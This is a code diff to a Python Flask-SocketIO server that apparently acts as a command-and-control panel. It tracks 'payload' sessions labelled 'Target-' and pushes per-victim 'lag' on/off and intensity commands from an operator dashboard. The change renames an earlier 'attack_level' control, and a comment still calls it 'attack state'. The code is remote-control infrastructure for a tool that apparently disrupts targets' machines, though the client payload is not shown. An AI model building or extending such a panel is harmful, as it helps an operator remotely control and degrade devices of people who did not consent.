@@ -42,13 +42,15 @@ socketio.start_background_task(check_offline_sessions)
 def dashboard_connect():
     emit('session_list_update', sessions)
 
-@socketio.on('update_attack_level', namespace='/dashboard')
-def handle_attack(data):
+@socketio.on('update_lag_state', namespace='/dashboard')
+def handle_lag(data):
     sid = data.get('session_id')
-    level = data.get('level')
+    status = data.get('status')
+    intensity = data.get('intensity')
     if sid in sessions:
-        sessions[sid]['attack_level'] = level
-        socketio.emit('command_update_attack', {'level': level}, namespace='/payload', room=sid)
+        sessions[sid]['lag_status'] = status
+        sessions[sid]['lag_intensity'] = intensity
+        socketio.emit('command_update_lag', {'status': status, 'intensity': intensity}, namespace='/payload', room=sid)
         emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
 
 @socketio.on('delete_session', namespace='/dashboard')
@@ -96,7 +98,8 @@ def payload_register(data):
             'nametag': f'Target-{sid[:4]}', 
             'status': 'online', 
             'last_seen': time.time(), 
-            'attack_level': 0
+            'lag_status': 'off',
+            'lag_intensity': 5
         }
     else:
         sessions[sid]['status'] = 'online'
@@ -105,8 +108,11 @@ def payload_register(data):
     socketio.emit('session_list_update', sessions, namespace='/dashboard')
     
     # Sync attack state (in case of reconnect)
-    current_level = sessions[sid]['attack_level']
-    emit('command_update_attack', {'level': current_level}, namespace='/payload', room=sid)
+    emit('command_update_lag', {
+        'status': sessions[sid]['lag_status'], 
+        'intensity': sessions[sid]['lag_intensity']
+    }, namespace='/payload', room=sid)
+
 
 @socketio.on('payload_heartbeat', namespace='/payload')
 def heartbeat(data):
